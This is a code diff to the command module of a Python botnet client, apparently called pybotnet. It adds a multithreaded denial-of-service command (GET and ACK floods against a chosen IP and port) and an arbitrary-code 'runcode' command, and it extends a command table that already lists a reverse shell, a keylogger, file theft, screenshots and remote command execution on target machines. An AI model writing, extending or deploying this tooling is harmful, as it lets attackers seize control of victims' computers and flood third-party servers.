@@ -12,6 +12,8 @@ from requests import get
 import sys
 from playsound import playsound
 import webbrowser
+import socket
+import random
 
 
 # pybotnet import
@@ -25,41 +27,42 @@ memory = ''
 scripts_name = {
     MAC_ADDRES: "`<system MAC_ADDRES> <command>`: run command on one target",
 
-    "help": "`help`: send this message",
+    "help":             "`help`: send this message",
 
-    "do_sleep": "`do_sleep <scconds> <message>`: print message and sleep",
+    "do_sleep":         "`do_sleep <scconds> <message>`: print message and sleep",
 
-    "get_info": "`get_info`: get target info",
+    "get_info":         "`get_info`: get target info",
 
-    "reverse_shell": "`<system MAC_ADDRES> reverse_shell`: start reverse shell on target system",
+    "reverse_shell":    "`<system MAC_ADDRES> reverse_shell`: start reverse shell on target system",
 
-    "export_file": "`export_file <download link>`: target donwload this file and save to script path",
+    "export_file":      "`export_file <download link>`: target donwload this file and save to script path",
 
-    "import_file": "`import_file <file route>`: get a file from target system",
+    "import_file":      "`import_file <file route>`: get a file from target system",
 
-    "screenshot":  "`screenshot`: Takes a screenshot, return the download link",
+    "screenshot":       "`screenshot`: Takes a screenshot, return the download link",
 
-    "info": "`info`: run `get_info` command!",
+    "info":             "`info`: run `get_info` command!",
 
-    "cmd": "`cmd <command>`: run command in target terminal",
+    "cmd":              "`cmd <command>`: run command in target terminal",
 
-    "/start": "`/start`: run `help` command!",
+    "/start":           "`/start`: run `help` command!",
 
-    "keylogger": "`keylogger start/stop`: Starts keylogger. use keylogger stop to stop keylogger",
+    "keylogger":        "`keylogger start/stop`: Starts keylogger. use keylogger stop to stop keylogger",
 
-    "schedule": """`schedule start <second> <shell-command>`: Starts a new schedule for a command.
-    `schedule list`: lists all schedules
-    `schedule stop <schedule name>`: Stops a schedule
-    """,
-    "playsound": "`playsound <soundname>` Plays a sound , MP3 or WAV Files. Sound file should be in the working path.",
-    "openurl": "`openurl <url> <how-many-times>` Will open a specified url n times",
-
+    "schedule":         """`schedule start <second> <shell-command>`: Starts a new schedule for a command.
+                        `schedule list`: lists all schedules
+                        `schedule stop <schedule name>`: Stops a schedule
+                        """,
+    "playsound":        "`playsound <soundname>` Plays a sound , MP3 or WAV Files. Sound file should be in the working path.",
+    "openurl":          "`openurl <url> <how-many-times>` Will open a specified url n times",
+    "dos":              """`dos <attack-type [GETFlood-ACKFlood]> <target-ip> <target-port> <thread-number> <payload-size>` Will run Denial-Of-Service Attack.""",
+    "runcode":          "`runcode <code>` Will run given python code. This function cant return values.",
 }
 
 
 def split_command(command: str) -> list:
     '''split string by space'''
-    return command.split(' ')
+    return command.split('\n') if '\n' in command else command.split(' ')
 
 
 def get_command_name(command: str) -> str:
@@ -171,6 +174,12 @@ def execute_scripts(command: str, pybotnet_up_time: int, is_shell: bool, ADMIN_C
 
             elif command_name == "openurl":
                 return openurl(logger, command)
+            
+            elif command_name == "dos":
+                return dos(logger,command)
+
+            elif command_name == "runcode":
+                return runcode(logger,command)
         logger.error('execute_scripts invalid command; Wrong format')
         return f"execute_scripts invalid command; Wrong format \n\n scripts name:\n {','.join(scripts_name)}"
 
@@ -542,6 +551,61 @@ def openurl(logger, command):
     except:
         logger.error("Error occurred.")
         return "Error occurred."
+
+def dos(logger,command):
+    splitted_command = split_command(command)
+
+    dostype = splitted_command[1]
+    target = splitted_command[2]
+    port = splitted_command[3]
+    thread_num = splitted_command[4]
+    payload = splitted_command[5]
+    if all(var.isdigit for var in [port,thread_num,payload]):
+        pass
+    else:
+        logger.error("Data was not correct.")
+        return "Data was not correct."
+
+
+    try:
+        logger.info(f"Checking IP {target} on port {port}")
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
+        s.connect((target, int(port)))
+        s.close()
+    except:
+        logger.error(f"IP {target} on port {port} failed.")
+        return f"IP {target} on port {port} failed."
+
+    else:
+        try:
+            payload = random._urandom(int(payload)) if dostype.lower() == "ackflood" else 1
+        except:
+            logger.error("Payload too big. Aborting.")
+            return "Payload too big , try smaller payloads."
+        else:
+            try:
+                logger.info("Starting Dos Attack...")
+                dos = util.dos(
+                    target,int(port),payload,dostype
+                )
+                for i in range(int(thread_num)):
+                    thread = threading.Thread(target=dos.attack)
+                    thread.start()
+            except:
+                logger.error("Something Failed. Maybe The Servers Are Down !")
+                return "Something Failed. Maybe The Servers Are Down !"
+
+        
+def runcode(logger,command):
+    code = ' '.join(split_command(command)[1:])
+    logger.info(f"Trying to run {code}")
+    try:
+        exec(command)
+        return "ِDone"
+    except Exception as error:
+        logger.error(f"Something failed while trying to run code. {error}")
+        return f"Something failed while trying to run code. {error}"
+
 
 
 def command_help(logger):
